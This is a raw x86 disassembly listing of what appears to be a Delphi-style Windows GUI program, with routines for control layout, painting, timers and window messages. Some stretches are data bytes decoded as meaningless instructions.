outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
add [ ebx ] 0xff0001b8
mov eax 0x1ff0001
outsd
inc ebp
outsb
inc esp
add [ ebx ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
add [ eax - 0x1 ] cl
inc edx
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
inc esp
outsd
arpl [ ebx - 0x70 ] bp
je r-xdata
add [ ebx ] 0x10
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
outsb
push ebx
je r-xdata
outsd
jbe r-xdata
dec ebp
add bh bh
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
push es
dec edi
outsb
inc ebp
js r-xdata
add [ ebx ] 0xd0
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x4e ] ch
inc edx
add [ eax ] ah
mov ah 0x34
inc eax
add [ eax - 0xfffbbee ] al
jb r-xdata
inc edx
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah al
mov ah 0x42
add al dh
retn
inc esp
jb r-xdata
adc al [ eax + eax - 0x10 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x68 ] bh
inc edx
add [ eax + 0x24004298 ] bl
add al [ eax ]
sub al 0x82
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x58 ] bp
xchg edi eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4298 ] dh
sub_429f30
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d304
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41da8c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41d304
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_41da8c
pop ebx
mov esp ebp
pop ebp
retn
sub_429ff4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41d410
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_429f30
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42a054
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_444930
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fd60
mov esi eax
mov [ ebx + 0x168 ] esi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] sub_42a498
mov [ esi + 0x24 ] ebx
mov eax ebx
mov dx 0xffc7
call sub_40346c
mov [ esi + 0x20 ] eax
mov edx 0x69
mov eax ebx
call sub_43c700
mov edx 0x69
mov eax ebx
call sub_43c6dc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42a0ec
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x168 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44498c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42a138
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x168 ]
call sub_420378
mov esi eax
mov eax [ ebx + 0x168 ]
call sub_420390
mov edi eax
mov eax ebx
call sub_43c924
mov [ esp ] eax
mov eax ebx
call sub_43c968
mov [ esp + 0x4 ] eax
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
cmp [ ebx + 0x17d ] 0x0
je r-xdata
mov esi [ esp ]
mov edi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
mov [ ebp ] eax
xor eax eax
mov [ ebp + 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] edi
cmp [ ebx + 0x179 ] 0x0
je r-xdata
cmp esi [ esp ]
jg r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp + 0x4 ]
sub eax edi
sar eax 0x1
jns r-xdata
test edi edi
jle r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
push eax
mov eax [ esp + 0x4 ]
sub eax esi
sar eax 0x1
jns r-xdata
adc eax 0x0
mov [ esp + 0x10 ] esi
fild [ esp + 0x10 ]
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
fdivp st1
fstp [ esp + 0x8 ]
fwait
cmp edi esi
jge r-xdata
push eax
push ebp
call OffsetRect
adc eax 0x0
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a68
mov esi eax
cmp esi [ esp ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a68
mov edi eax
cmp edi [ esp + 0x4 ]
jle r-xdata
mov esi [ esp ]
fild [ esp ]
fdiv [ esp + 0x8 ]
call sub_402a68
mov edi eax
jmp r-xdata
mov edi [ esp + 0x4 ]
fild [ esp + 0x4 ]
fmul [ esp + 0x8 ]
call sub_402a68
mov esi eax
jmp r-xdata
sub_42a264
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x17c ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x17c ] 0x1
xor eax eax
push ebp
push sub_42a315
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42a138
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x168 ]
mov ecx [ eax + 0xc ]
mov eax ebx
call sub_41db0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a31c
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x17c ] dl
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41d3e0
mov eax [ ebx + 0x14 ]
mov dl 0x1
call sub_41d700
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_41dac4
sub_42a324
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x168 ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_453eac
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_443a0c
test al al
je r-xdata
cmp [ ebp + 0x17c ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_443708
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43e0d4
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42a3bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov esi eax
mov ebx [ ebp + 0x10 ]
test [ esi + 0x17a ] bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov eax esi
call sub_42a324
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx edi
mov eax [ esi + 0x174 ]
call [ esi + 0x170 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x8c ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
sub_42a498
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x168 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebx + 0x168 ]
call sub_420378
test eax eax
jle r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_420390
test eax eax
jle r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esp
mov eax ebx
call sub_42a138
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
mov eax [ ebx + 0x168 ]
call sub_420378
push eax
mov eax [ ebx + 0x168 ]
call sub_420390
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
cmp [ esp ] 0x0
jg r-xdata
mov dl [ ebx + 0x17b ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
cmp [ ebx + 0x17c ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
jmp r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ ebx + 0x48 ]
jl r-xdata
mov eax [ esp + 0xc ]
cmp eax [ ebx + 0x4c ]
jl r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_42a324
test al al
je r-xdata
sub_42a5c0
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov bl 0x1
test [ esi + 0x1c ] 0x10
je r-xdata
mov al [ esi + 0x5b ]
test al al
je r-xdata
mov eax [ esi + 0x168 ]
call sub_420378
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_420378
mov [ edi ] eax
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x168 ]
call sub_420390
test eax eax
jle r-xdata
mov eax [ esi + 0x168 ]
call sub_420390
mov [ ebp ] eax
mov al [ esi + 0x5b ]
sub al 0x3
jae r-xdata
sub_42a628
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a2c
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42a6b0
call sub_41ab78
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42a678
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42a724
mov eax [ esi + 0x34 ]
call sub_41ac2c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a78
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42a6b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42a6ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a724
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42a7a3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a7aa
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
sub_42a7fc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4453b0
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42f548
call sub_42f628
test al al
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov edx 0xb9
mov eax esi
call sub_43c6dc
mov edx 0x29
mov eax esi
call sub_43c700
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42ac4c
mov edx 0x1
mov eax esi
call sub_42ac68
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_43d0c0
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_44399c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42a8c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440594
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42a930
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442d20
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_440ca8
sub_42a970
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42aa60
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43cf20
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_441be4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aa67
lea eax [ ebp - 0x14 ]
call sub_403fa8
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_443708
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_443708
push eax
call InvalidateRect
sub_42aa70
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42aaa8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ac0a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_429ff4
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42aa70
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_429ff4
mov esi [ ebx + 0x208 ]
call sub_42f548
call sub_42f628
test al al
je r-xdata
push ebp
call sub_42aa70
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_429ff4
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d5e4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_41d988
mov eax ebx
call sub_4448e8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_43f200
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43cf20
mov eax [ ebp - 0x1c ]
call sub_404468
push eax
mov eax esi
call sub_41dd2c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac11
lea eax [ ebp - 0x1c ]
call sub_403fa8
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41d700
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41dc4c
mov edx r-xdata
mov eax esi
call sub_41dba8
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_42acbc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f774
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_42ad14
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44239c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_42ae35
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_44239c
call sub_403a90
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43c700
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43c6dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_42ae50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_444250
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_42ae7c
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_4448f0
pop esi
pop ebx
retn
sub_42aebc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
scasd [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
scasd [ edi ]
inc edx
add al ch
scasd [ edi ]
inc edx
add [ edx + eax ] bl
add [ eax ] al
add [ ebx + eax * 2 ] bl
add [ ecx + 0x34ac0041 ] bl
inc eax
add al dh
0x34b40041 0x40
adc [ edx ] 0x44
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + esi * 4 + 0x42200042 ] ah
inc esp
add [ eax + 0xa ] cl
inc esp
add [ eax ] al
inc ebp
inc ecx
add ah bl
out dx eax
inc ebx
add al dh
retn
sub_42af16
inc ebx
add ah bh
test [ ebx ] 0x8
int 0x43
add [ ecx - 0x6163ffbf ] dh
inc ecx
add [ esi + ebx * 4 - 0x5e43ffbf ] dl
inc ecx
add [ eax + 0x46 ] ah
inc ebx
add [ edi + 0x42500044 ] dh
inc esp
add [ ecx + eax * 2 - 0x3d9bffbc ] bl
inc ebx
add [ eax - 0x2fffbbc9 ] dh
aaa
inc esp
add al ch
xor al 0x44
add [ ecx + eax * 8 - 0x3e4fffbd ] ch
inc ebx
add [ ecx + esi * 8 - 0xe27ffbd ] ch
inc ebx
add al dh
int3
sub_42b020
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_434660
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413de8
xor edx edx
mov eax edi
call sub_43ce40
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_43d094
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42b450
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42b0a4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_414088
mov edx ebx
and dl 0xfc
mov eax esi
